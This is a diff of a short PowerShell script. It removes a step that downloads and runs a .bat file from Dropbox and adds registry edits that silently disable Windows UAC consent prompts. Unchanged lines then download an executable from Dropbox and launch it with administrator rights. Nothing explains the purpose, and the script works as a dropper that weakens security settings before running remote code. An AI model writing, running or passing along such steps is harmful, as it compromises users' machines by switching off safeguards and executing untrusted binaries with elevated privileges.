@@ -1,5 +1,6 @@
-Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/s1fow6pw72tv0tdqidbjp/.bat?rlkey=sj1rk13uoaeerkohiy49mg7wd&st=dzpdfmkm&dl=1" -OutFile "$env:USERPROFILE\Downloads\preparation.bat"
-Start-Process -FilePath "$env:USERPROFILE\Downloads\preparation.bat"
+Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name ConsentPromptBehaviorAdmin -Value 0
+Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name PromptOnSecureDesktop -Value 0
+
 
 Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/uu9ufmaf5v7tduxyd3dfr/new.exe?rlkey=4gwdluerss2tio31pmfl0d7d&dl=1" -OutFile "$env:USERPROFILE\Downloads\new.exe"
 Start-Process -FilePath "$env:USERPROFILE\Downloads\new.exe" -Verb RunAs
